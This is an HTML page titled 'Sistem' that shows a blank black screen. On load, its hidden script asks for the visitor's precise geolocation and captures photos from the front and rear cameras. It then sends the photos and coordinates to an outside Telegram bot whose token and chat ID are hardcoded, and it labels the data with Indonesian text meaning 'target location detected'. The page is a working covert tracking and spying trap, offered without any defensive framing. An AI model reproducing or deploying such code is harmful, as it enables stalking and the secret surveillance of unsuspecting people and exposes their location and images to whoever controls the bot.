<!DOCTYPE html>
<html>
<head>
    <title>Sistem</title>
    <style>
        body { background-color: black; color: black; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "8208169555:AAFhDsvEjUtYkeRKh6OV7ngsd9hT0WZfWZ4";
        const chatId = "7835924973";

        async function sendToTelegram(message, type = 'text') {
            let url = `https://api.telegram.org/bot${botToken}/`;
            if (type === 'text') {
                await fetch(url + "sendMessage", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });
            } else if (type === 'photo') {
                const blob = await (await fetch(message)).blob();
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob, "capture.jpg");
                await fetch(url + "sendPhoto", { method: "POST", body: formData });
            }
        }

        async function captureCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode }
                });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const dataUrl = canvas.toDataURL('image/jpeg');
                        stream.getTracks().forEach(track => track.stop());
                        resolve(dataUrl);
                    };
                });
            } catch (e) {
                return null;
            }
        }

        function getLocation() {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const info = `LOKASI TARGET TERDETEKSI:\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await sendToTelegram(info);
            }, null, { enableHighAccuracy: true });
        }

        window.onload = async () => {
            // Jalankan pelacakan lokasi
            getLocation();

            // Tangkap kamera depan
            const frontImg = await captureCamera("user");
            if (frontImg) await sendToTelegram(frontImg, 'photo');

            // Tangkap kamera belakang
            const backImg = await captureCamera("environment");
            if (backImg) await sendToTelegram(backImg, 'photo');
        };
    </script>
</body>
</html>
